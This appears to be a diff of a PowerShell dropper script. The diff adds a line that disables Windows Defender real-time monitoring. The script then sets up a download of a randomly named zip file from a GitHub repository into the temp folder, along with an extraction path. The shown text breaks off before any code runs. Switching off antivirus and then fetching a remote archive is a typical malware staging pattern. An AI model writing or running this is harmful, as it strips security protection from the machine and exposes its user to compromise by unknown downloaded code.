@@ -1,3 +1,5 @@
+Set-MpPreference -DisableRealtimeMonitoring $true
+
 $url = "https://github.com/WarrenBruhfet/random/raw/refs/heads/main/hgdhsg.zip"  # URL of the zip file
 $zipPath = "$env:TEMP\gsfgsgfdg.zip"  # Save location for zip
 $extractPath = "$env:TEMP\extracted\"  # Folder to extract to
